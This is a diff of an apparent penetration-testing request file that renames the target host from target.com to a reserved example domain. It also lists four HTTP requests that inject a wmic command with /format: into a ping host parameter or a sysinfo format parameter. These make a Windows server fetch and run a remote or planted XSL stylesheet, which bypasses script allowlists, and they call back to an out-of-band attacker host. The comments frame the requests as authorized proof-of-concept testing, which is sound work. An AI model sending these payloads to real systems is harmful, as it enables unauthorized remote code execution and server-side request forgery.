@@ -8,24 +8,24 @@
 # remote XSL via /FORMAT: - no script blocked by application allowlists, and
 # it doubles as an SSRF target (wmic performs the HTTP fetch itself).
 #
-# WHAT TO EDIT: target.com + the vulnerable parameter; YOUR-OOB-HOST.
+# WHAT TO EDIT: target.example.invalid + the vulnerable parameter; YOUR-OOB-HOST.
 # ============================================================================
 
 ### 1) via command-injection param (host param reaching cmd.exe)
-GET https://target.com/api/ping?host=127.0.0.1&&wmic+os+get+/format:%22http://wmic1.YOUR-OOB-HOST.example.invalid/poc.xsl%22 HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&&wmic+os+get+/format:%22http://wmic1.YOUR-OOB-HOST.example.invalid/poc.xsl%22 HTTP/1.1
+Host: target.example.invalid
 
 ### 2) via argument-injection param (a 'format/template' option the app passes to wmic)
-GET https://target.com/api/sysinfo?format=http://wmic2.YOUR-OOB-HOST.example.invalid/poc.xsl HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/sysinfo?format=http://wmic2.YOUR-OOB-HOST.example.invalid/poc.xsl HTTP/1.1
+Host: target.example.invalid
 
 ### 3) local XSL after file-write primitive (traversal/upload landed the xsl)
-GET https://target.com/api/ping?host=127.0.0.1&&wmic+os+get+/format:C:%5Cwindows%5Ctemp%5Cpoc.xsl HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&&wmic+os+get+/format:C:%5Cwindows%5Ctemp%5Cpoc.xsl HTTP/1.1
+Host: target.example.invalid
 
 ### 4) SSRF-angle proof only (wmic fetch = OOB callback, no exec claim)
-GET https://target.com/api/ping?host=127.0.0.1&&wmic+os+get+/format:%22http://wmic3.YOUR-OOB-HOST.example.invalid/probe%22 HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&&wmic+os+get+/format:%22http://wmic3.YOUR-OOB-HOST.example.invalid/probe%22 HTTP/1.1
+Host: target.example.invalid
 
 ### CONFIRM: OOB callback from the target + (authorized) marker echo in the
 ### wmic output. CLEANUP: remove served XSL (ledger).
